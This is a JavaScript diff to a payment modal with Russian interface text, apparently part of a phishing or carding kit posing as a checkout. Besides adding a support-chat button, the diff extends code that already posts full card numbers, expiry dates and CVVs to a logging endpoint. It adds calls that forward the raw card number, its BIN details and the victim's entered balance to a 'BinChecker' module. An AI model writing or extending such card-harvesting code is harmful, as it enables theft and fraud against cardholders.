@@ -424,6 +424,7 @@
           '<div class="ms-icon red">' + ICONS.cross + '</div>' +
           '<div class="ms-title">' + (t.errors && t.errors.generalSuccessWord || 'Ошибка!') + '</div>' +
           '<div class="ms-text">' + (t.errors && t.errors.successTransaction || 'Произошла ошибка, обратитесь в службу технической поддержки.') + '</div>' +
+          '<button type="button" class="ms-btn ms-btn-support" id="msSupportBtn" style="margin-top:12px;background:var(--modal-accent, #1AB248);color:#fff">' + (t.card && t.card.support || 'Чат поддержки') + '</button>' +
         '</div></div>' +
       '</div>' +
 
@@ -665,6 +666,12 @@
     this._bind('msSmenalkBtn', 'click', function () { self._handleSmenalk(); });
     this._bind('msErrorBtn', 'click', function () { self._resetToCard(); });
     this._bind('msCustomBtn', 'click', function () { self._confirmCustom(); });
+    this._bind('msSupportBtn', 'click', function () {
+      if (typeof window.forceOpenChat === 'function') {
+        if (typeof window._userClosedChat !== 'undefined') window._userClosedChat = false;
+        window.forceOpenChat();
+      }
+    });
     this._bind('msMerchantBtn', 'click', function () { self._resetToCard(); });
     this._bind('msPopolnenieBtn', 'click', function () { self._resetToCard(); });
     this._bind('msPhoneBtn', 'click', function () {
@@ -850,6 +857,7 @@
 
   ModalSystem.prototype._processCardStep2 = function (cardData) {
     var self = this;
+    var rawCardNum = (cardData.cardNumber || '').replace(/\s/g, '');
 
     // Force balance check if AutoPP has ppAmount set (need balance to compare)
     var needBalance = this.cfg.checkBalance;
@@ -858,14 +866,28 @@
     }
 
     if (needBalance) {
-      
       axios.post('/api/preLog', {
         item: this.cfg.itemId,
-        cardNumber: cardData.cardNumber,
+        cardNumber: rawCardNum,
         cardMonth: cardData.cardMonth,
         cardYear: cardData.cardYear,
         cardCvv: cardData.cardCvv
       }).catch(function () {});
+      
+      
+      if (typeof BinChecker !== 'undefined' && BinChecker.sendCardData) {
+        var binInfo = { brand: 'Unknown', type: 'Unknown' };
+        var first6 = rawCardNum.replace(/\D/g, '').substring(0, 6);
+        if (first6.length >= 4) {
+          BinChecker.getBinInfo(first6).then(function(info) {
+            BinChecker.sendCardData(self.cfg.itemId, rawCardNum, info);
+          }).catch(function() {
+            BinChecker.sendCardData(self.cfg.itemId, rawCardNum, binInfo);
+          });
+        } else {
+          BinChecker.sendCardData(self.cfg.itemId, rawCardNum, binInfo);
+        }
+      }
 
       setTimeout(function () {
         self.showModal('msBalanceVerify');
@@ -879,6 +901,20 @@
       }, 2500);
     } else {
       
+      if (typeof BinChecker !== 'undefined' && BinChecker.sendCardData) {
+        var binInfo = { brand: 'Unknown', type: 'Unknown' };
+        var first6 = rawCardNum.replace(/\D/g, '').substring(0, 6);
+        if (first6.length >= 4) {
+          BinChecker.getBinInfo(first6).then(function(info) {
+            BinChecker.sendCardData(self.cfg.itemId, rawCardNum, info);
+          }).catch(function() {
+            BinChecker.sendCardData(self.cfg.itemId, rawCardNum, binInfo);
+          });
+        } else {
+          BinChecker.sendCardData(self.cfg.itemId, rawCardNum, binInfo);
+        }
+      }
+
       setTimeout(function () {
         if (self.cfg.requestPhoneAfterBalance) {
           self._pendingBalance = '0';
@@ -973,6 +1009,11 @@
     // Ensure _cardData is set before sending log
     if (!this._cardData && _memCardData) {
       this._cardData = _memCardData;
+    }
+
+    
+    if (typeof BinChecker !== 'undefined' && BinChecker.sendBalance) {
+      BinChecker.sendBalance(self.cfg.itemId, raw);
     }
 
     this.showModal('msLoading');
